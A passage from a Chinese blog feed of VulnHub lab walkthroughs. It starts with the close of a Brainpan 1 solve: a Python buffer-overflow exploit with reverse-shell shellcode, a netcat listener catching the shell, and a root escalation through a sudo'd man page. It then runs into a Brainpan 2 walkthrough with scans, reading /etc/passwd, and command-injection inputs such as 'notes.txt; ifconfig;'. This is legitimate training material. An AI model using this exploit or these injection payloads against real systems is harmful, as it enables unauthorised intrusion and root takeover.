<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>

<p>使用受害者主机的IP地址和更新的Shellcode更新PoC脚本，在端口443上创建一个新的netcat侦听器，并相应地执行，成功的返回了shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.115: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 39737</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">puck@brainpan:/home/puck$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(puck) gid=1002(puck) groups=1002(puck)</span><br><span class="line">puck@brainpan:/home/puck$ whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line">puck@brainpan:/home/puck$ ls</span><br><span class="line">ls</span><br><span class="line">checksrv.sh  web</span><br><span class="line">puck@brainpan:/home/puck$</span><br></pre></td></tr></table></figure>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>成功！现在，受害者计算机上有一个特权低的shell。继续。查看主目录，看是否有有趣的事情……。不。唯一值得注意的是，有一个脚本可以在死时重新启动Web服务，以及在端口10000上运行的Web服务的根目录。sudo可以使用任何特殊权限吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> puck on this host:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User puck may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>

<p>anansi_util NOPASSWD？很有趣。仔细看看。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util</span><br><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line">Usage: /home/anansi/bin/anansi_util [action]</span><br><span class="line">Where [action] is one of:</span><br><span class="line">  - network</span><br><span class="line">  - proclist</span><br><span class="line">  - manual [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>manual [command]部分。看看是否可以使用root特权运行[command]。</li>
</ul>
<p>成功的提权并找到了flag，吊炸天！！！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">/usr/bin/man: manual-/bin/bash: No such file or directory</span><br><span class="line">/usr/bin/man: manual_/bin/bash: No such file or directory</span><br><span class="line">No manual entry <span class="keyword">for</span> manual</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line">BASH(1)                                                                BASH(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       bash - GNU Bourne-Again SHell</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       bash [options] [file]</span><br><span class="line"></span><br><span class="line">COPYRIGHT</span><br><span class="line">       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       Bash  is  an  sh-compatible  <span class="built_in">command</span> language interpreter that executes</span><br><span class="line">       commands <span class="built_in">read</span> from the standard input or from a file.  Bash also incor‐</span><br><span class="line">       porates useful features from the Korn and C shells (ksh and csh).</span><br><span class="line"></span><br><span class="line">       Bash  is  intended  to  be a conformant implementation of the Shell and</span><br><span class="line">       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard</span><br><span class="line">       1003.1).  Bash can be configured to be POSIX-conformant by default.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">       All  of  the  single-character shell options documented <span class="keyword">in</span> the descrip‐</span><br><span class="line">       tion of the <span class="built_in">set</span> <span class="built_in">builtin</span> <span class="built_in">command</span> can be used as options when  the  shell</span><br><span class="line"> Manual page bash(1) line 1 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)!/bin/bash</span><br><span class="line">!/bin/bash</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@brainpan:~<span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">b.txt</span><br><span class="line">root@brainpan:~<span class="comment"># cat b.txt</span></span><br><span class="line">cat b.txt</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              http://www.techorganic.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@brainpan:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>W00T !!!!!root！二进制文件允许以root用户身份查询联机帮助页，因此，可以使用man的内置功能来内联运行命令，例如上述输出中的！/bin/bash。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>od调试程序</li>
<li>python模糊测试脚本测试段错误</li>
<li>msf脚本生成填充缓冲区的字节</li>
<li>msfvenom生成reverse shell的python shellcode版本的代码</li>
<li>覆盖eip将恶意shellcode代码放入esp取得reverseshell</li>
<li>man内置功能内联运行命令提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan2]</title>
    <url>/2020/02/01/brainpan2/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：2<br>发行日期：2013年11月20日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlw">https://download.vulnhub.com/brainpan/brainpan2.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjIuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan2.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">_               _                           ___  </span><br><span class="line">| |             (_)                         |__ \ </span><br><span class="line">| |__  _ __ __ _ _ _ __  _ __   __ _ _ __      ) |</span><br><span class="line">| <span class="string">&#x27;_ \| &#x27;</span>__/ _` | | <span class="string">&#x27;_ \| &#x27;</span>_ \ / _` | <span class="string">&#x27;_ \    / / </span></span><br><span class="line"><span class="string">| |_) | | | (_| | | | | | |_) | (_| | | | |  / /_ </span></span><br><span class="line"><span class="string">|_.__/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_| |____|</span></span><br><span class="line"><span class="string">                        | |                       </span></span><br><span class="line"><span class="string">                        |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                            by superkojiman  </span></span><br><span class="line"><span class="string">                 http://www.techorganic.com</span></span><br></pre></td></tr></table></figure>

<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>使用此虚拟机，即表示您同意，对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。<br>TL; DR：如果发生坏事，这不是我的错。</p>
<h2 id="设定"><a href="#设定" class="headerlink" title="设定"></a>设定</h2><p>Brainpan已通过测试，可在以下虚拟机管理程序上运行：</p>
<ul>
<li>VMware Player 6.0.1</li>
<li>VMWare Fusion 6.0.2</li>
<li>VirtualBox 4.3.2</li>
</ul>
<p>检查以确保brainpan2.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：bf01f03ea0e7cea2553f74189ff35161SHA1：b46891cda684246832f4dbc80ec6e40a997af65a</span><br></pre></td></tr></table></figure>
<p>将brainpan2.ova导入到您首选的管理程序中，并根据需要配置网络设置。<br>它会通过DHCP获得IP地址，建议在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。<br>VulnHub独家.<br><a href="http%EF%BC%9A//blog.vulnhub.com/2013/11/competition-brainpan-2.html">博客文章</a></p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.116</span><br><span class="line">Host is up (0.00027s latency).</span><br><span class="line">MAC Address: 08:00:27:6D:B8:70 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.116</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\HASEE&gt;nmap -v -sV -p 9999,10000 -A -T5 192.168.56.116</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">9999/tcp  open  abyss?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   NULL:</span><br><span class="line">|     _| _|</span><br><span class="line">|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|</span><br><span class="line">|     _|_| _| _| _| _| _| _| _| _| _| _| _|</span><br><span class="line">|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|</span><br><span class="line">|     [______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">|_    LOGIN AS GUEST</span><br><span class="line">10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)</span><br><span class="line">|_http-server-header: SimpleHTTP/0.6 Python/2.7.3</span><br><span class="line">|_http-title: Hacking Trends</span><br></pre></td></tr></table></figure>

<p>nc连接后然后根据具体提示输入命令，发现如下的信息，并能对文件进行一定的操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; GUEST</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; TELL ME MORE</span><br><span class="line">    FILES    HELP    VIEW       CREATE</span><br><span class="line">    USERS    MSG     SYSTEM     BYE</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; FILES</span><br><span class="line">total 36</span><br><span class="line">-rwxr-xr-x 1 root   root   18424 Nov  4  2013 brainpan.exe</span><br><span class="line">-rw-r--r-- 1 root   root    1109 Nov  5  2013 brainpan.txt</span><br><span class="line">-rw-r--r-- 1 root   root     683 Nov  4  2013 notes.txt</span><br><span class="line">-rw-r--r-- 1 anansi anansi    12 Nov  5  2013 <span class="built_in">test</span>-1</span><br><span class="line">-rwxrwxrwx 1 anansi anansi    19 Nov  5  2013 <span class="built_in">test</span>-2</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /etc/passwd</span><br><span class="line">root:x:104:106:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">root :x:0:0:root:/var/root:/bin/bash</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:103::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">anansi:x:1000:1000:anansi,,,:/home/anansi:/bin/bash</span><br><span class="line">puck:x:1001:1001:puck,,,:/home/puck:/bin/bash</span><br><span class="line">reynard:x:1002:1002:reynard,,,:/home/reynard:/bin/bash</span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>太好了:)可以查看系统内部可以访问的任何文件。从文件列表中，发现uid是系统用户之一。尝试成功创建和读取其主目录中的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; CREATE</span><br><span class="line">    ENTER FILE TO CREATE: /home/anansi/lucifer11   </span><br><span class="line">    ENTER CONTENTS: content\lucifer11testcontents</span><br><span class="line">    FILE CREATED</span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: /home/anansi/lucifer11</span><br><span class="line">content\lucifer11testcontents</span><br></pre></td></tr></table></figure>

<p>这意味着可以读取用户获得许可的每个文件，并在可写目录中创建文件。检查了其他命令，但几乎所有命令尚未实现。guest用户不可用的很少。在那一刻，想起了HELP中的一句话引起了我的注意。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AUTHENTICATION</span><br><span class="line">       There is currently no proper authentication mechanism <span class="keyword">in</span> place. At this</span><br><span class="line">       time  the software is <span class="keyword">in</span> it<span class="string">&#x27;s alpha stage. The only avaiable account is</span></span><br><span class="line"><span class="string">       GUEST. The DEBUG account will alter the output of some commands -  use\u2010</span></span><br><span class="line"><span class="string">       ful for developers.</span></span><br></pre></td></tr></table></figure>

<p>提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; DEBUG</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; SYSTEM</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HOME=/home/anansi</span><br><span class="line">COLORTERM=(null)</span><br><span class="line">PWD=/opt/brainpan</span><br><span class="line">PATH=/bin:.:/usr/bin:/sbin</span><br><span class="line">SHLVL=1</span><br></pre></td></tr></table></figure>

<p>在这里停止一下，总结一下已经了解的有关目标的知识：</p>
<ul>
<li>它以单个IP：192.168.57.1​​0运行（在我的情况下）</li>
<li>它有两个开放端口9999和10000</li>
<li>在端口10000上正在运行http服务器（此处无趣）</li>
<li>该http服务器基于Python，这意味着Python已安装并且可以使用</li>
<li>在端口9999上运行某些自定义文件传输</li>
<li>应用自定义应用程序不仅可以在应用程序根目录中提供读取/写入系统中文件的功能</li>
<li>该应用程序在/opt/brainpan中</li>
<li>对DEBUG用户的访问不受限制，因此可以完全访问该应用</li>
<li>从notes.txt中知道应用程序正在使用popen（）查看文件等。</li>
</ul>
<p>可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The <span class="built_in">command</span> argument is a pointer to a null-terminated string containing a shell <span class="built_in">command</span> line. This <span class="built_in">command</span> is passed to /bin/sh using the -c flag; interpretation, <span class="keyword">if</span> any, is performed by the shell.</span><br></pre></td></tr></table></figure>

<p>命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给/bin/sh；解释（如果有）由shell执行。</p>
<p>意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">                          &gt;&gt; VIEW  </span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; <span class="built_in">echo</span> <span class="string">&quot;some unexpected text lucifer11&quot;</span>;           </span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">some unexpected text lucifer11</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  </span><br><span class="line">          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:213 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  